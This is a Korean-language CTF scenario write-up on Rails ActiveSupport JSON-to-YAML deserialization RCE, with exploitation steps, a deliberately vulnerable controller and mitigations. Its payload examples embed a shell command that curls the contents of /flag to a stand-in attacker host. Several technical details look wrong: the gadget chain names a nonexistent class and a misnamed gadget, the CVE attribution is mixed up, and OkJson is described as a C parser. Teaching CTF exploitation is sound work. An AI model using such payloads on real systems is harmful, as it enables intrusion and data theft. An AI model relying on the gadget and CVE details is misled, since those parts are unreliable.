---
title: Ruby on Rails ActiveSupport JSON Deserialization RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, rails, ruby, deserialization, rce, active-support, yaml-gadget]
confidence: high
---

# Ruby on Rails ActiveSupport JSON Deserialization RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Rails JSON API Service (레일즈 JSON API 가공 포털)
- **난이도**: High
- **핵심 컨셉**: Ruby on Rails 프레임워크의 역사적/구조적 JSON 데이터 디코딩 결함을 역이용하는 **ActiveSupport JSON 역직렬화 RCE (원격 코드 실행)** 취약점 문제입니다. 대상 웹 애플리케이션은 루비 온 레일즈(Ruby on Rails) 환경 하에서 구동되며, 사용자가 입력한 중요 진단 정보 데이터를 JSON 파싱 API 엔드포인트에서 처리합니다. 이때 연동된 Rails 내장 패키지인 `ActiveSupport::JSON` 모듈은 내부 처리 성능과 호환성을 확보하기 위해, JSON 데이터를 먼저 YAML 호환 포맷으로 변환한 뒤 YAML 파서를 거쳐 해석하도록 동작합니다. 공격자는 JSON 구조의 문자열 내부에 루비 객체를 인스턴스화할 수 있는 **`!ruby/object:`**와 같은 YAML 태그와 공격자 컴파일용 가젯 체인을 삽입하여 백엔드 서버에서 OS 쉘 명령을 구동시키는 RCE를 발생시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Rails Parse API (`/api/diagnostics`)**:
  - 사용자가 기입한 진단 JSON 문자열 데이터를 `ActiveSupport::JSON.decode(json_string)` 함수로 직접 처리하는 API 컨트롤러.
- **Flag 위치**:
  - 시스템 루트 경로 `/flag` 파일에 존재하며 RCE로 탈취하여 확인해야 합니다.

### 2.2 취약점 지점
1. **Unsafe JSON to YAML Conversion (ActiveSupport 결함)**:
   - 특정 Rails 및 ActiveSupport 레거시 버전은 JSON 파싱 로직 내부에서 입력 문자열을 치환한 뒤 `YAML.load` 함수를 거쳐 메모리에 적재하도록 내부 설계되어 있었습니다.
   - 이로 인해 YAML 파서 특유의 루비 클래스 객체 임의 인스턴스화 기능(`!ruby/object:`)이 JSON 파싱 파이프라인 상에서도 그대로 유효하게 작동하는 심각한 보안 홀이 열립니다.
2. **Ruby Gadget Chain Abuse (ActiveSupport::Deprecation::DeprecatedInstanceVariable)**:
   - 루비 환경 내에 이미 정의되어 있는 시스템 클래스들(가젯)을 조합하여 RCE 체인을 구성합니다.
   - `ActiveSupport::Deprecation::DeprecatedInstanceVariable` 이나 `ActionController::Routing::RouteSet` 등과 같은 클래스는 생성되거나 특정 겟터/세터 메서드가 기동될 때 내부 변수 문자열을 `eval` 하거나 시스템 `Kernel.system`에 위임하는 성질이 있어, 런타임 OS 명령어 실행을 가능케 합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 / 바디 | 파서 결함 | 목적 |
|------------|--------|------|-----------------|-----------|------|
| `/api/diagnostics` | POST | 불필요 | JSON String | `ActiveSupport::JSON.decode` | 루비 객체 인스턴스화 및 쉘 명령 구동 RCE |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Rails 환경 및 파서 특성 파악
1. 포털 응답 헤더의 `X-Runtime` 또는 `X-Powered-By: Phusion Passenger` 등의 헤더를 보고 Ruby on Rails 스택임을 확인합니다.
2. API 전송 후 에러 발생 시의 루비 백트레이스 로그에서 `active_support/json/decoding.rb` 등의 파일명이 노출되는 것을 확인하여 ActiveSupport JSON 모듈이 연동되고 있음을 유추합니다.

### Step 2. Ruby YAML RCE 가젯 체인 탐색 및 구성
루비 환경 내에서 객체 로드 시 쉘 명령을 바로 기동할 수 있는 최적의 가젯 조합을 검색하고 구성합니다.
- **루비 YAML RCE 오브젝트 구조 예시**:
  ```yaml
  --- !ruby/object:ActiveSupport::Deprecation::DeprecatedInstanceVariable
  owner: !ruby/object:ActiveSupport::Double
  method: :to_s
  var: "@test"
  deprecator: !ruby/object:ActiveSupport::Deprecation
  # eval을 수행할 루비 명령 문자열
  message: "system('curl http://attacker.local/log?c=$(cat /flag)')"
  ```
- 이 YAML 구조를 그대로 JSON 형식에 수용 가능하도록 문자열 매핑 변환을 적용합니다.

### Step 3. JSON 가젯 주입 페이로드 송신
1. 백엔드의 `ActiveSupport::JSON.decode` 함수가 이 주입 문자열을 YAML로 번역하는 과정을 역이용할 수 있게 JSON 형태로 파라미터를 조립합니다.
   - **요청 Body 예시**:
     ```json
     {
       "diagnostics_data": "{\"json_key\": \"!ruby/object:ActiveSupport::Deprecation::DeprecatedInstanceVariable {\\n  owner: !ruby/object:ActiveSupport::Double,\\n  method: :to_s,\\n  var: \\\"@test\\\",\\n  deprecator: !ruby/object:ActiveSupport::Deprecation,\\n  message: \\\"system('curl http://attacker.local/log?c=$(cat /flag)')\\\"\\n}\"}"
     }
     ```
     *(실제 CVE-2013-0156 의 경우 XML/JSON 파싱 과정에서 직접적인 객체 선언이 가능함)*
2. 서버는 이 JSON 입력을 받아 디코딩 로직을 실행합니다.

### Step 4. flag 획득
1. `ActiveSupport::JSON.decode`가 내부 변환을 시도하며 YAML.load를 호출하는 순간, 주입된 `DeprecatedInstanceVariable` 객체가 메모리 상에 강제 인스턴스화됩니다.
2. 루비 객체 인스턴스 소멸자 혹은 속성 초기화/렌더링 런타임 단계에서 `message` 내부의 루비 명령어 `system('curl...')`가 `eval` 처리되며 OS 쉘에서 작동합니다.
3. 공격자의 수신 로거에 플래그 데이터(`FLAG{ruby_on_rails_activesupport_json_yaml_rce}`)가 송출되어 획득을 완료합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Ruby on Rails)

```ruby
# diagnostics_controller.rb (취약한 Rails 컨트롤러 예시)
class DiagnosticsController < ApplicationController
  skip_before_action :verify_authenticity_token

  def create
    # 취약점 지점 1: 사용자가 인자로 넘긴 diagnostics_data 문자열을 
    # ActiveSupport::JSON.decode를 사용해 해독함
    # 특정 구버전 Rails 환경은 이 디코딩 내부에서 YAML 파싱을 거쳐 
    # !ruby/object 객체 역직렬화를 허용함
    raw_data = params[:diagnostics_data]

    if raw_data.blank?
      render json: { error: "Missing diagnostics_data" }, status: 400
      return
    end

    begin
      # 취약점 지점 2: 디코더 가동 과정에서 YAML 역직렬화 RCE 발생
      parsed_result = ActiveSupport::JSON.decode(raw_data)
      
      render json: { status: "success", type: parsed_result.class.to_s }
    rescue => e
      render json: { status: "error", message: e.message }, status: 500
    end
  end
end
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **Rails 및 ActiveSupport 보안 패치 버전 업그레이드**:
   - JSON 파싱 모듈 내부에서 YAML 해석기를 거쳐 로드되던 취약 로직이 제거된 안전한 최신 버전의 Ruby on Rails 및 ActiveSupport 라이브러리로 전면 업그레이드합니다.
2. **`OkJson` 혹은 `Oj` 전용 서드파티 파서 연동**:
   - `ActiveSupport::JSON.backend` 설정을 `OkJson` 또는 순수 C로 구현되어 객체 역직렬화 위험을 내포하지 않는 안전한 JSON 파싱 모듈(예: `Oj` 라이브러리)로 강제 고정하여 사용합니다.
     ```ruby
     # config/initializers/json.rb
     ActiveSupport::JSON.backend = "OkJson"
     ```
3. **YAML Safe Load 정책 수립**:
   - 루비의 YAML 파서 기동 시 `YAML.safe_load`만을 사용하게 제한하여, 외부 입력을 통한 임의 루비 클래스 객체의 생성 동작 자체를 근본적으로 무력화합니다.
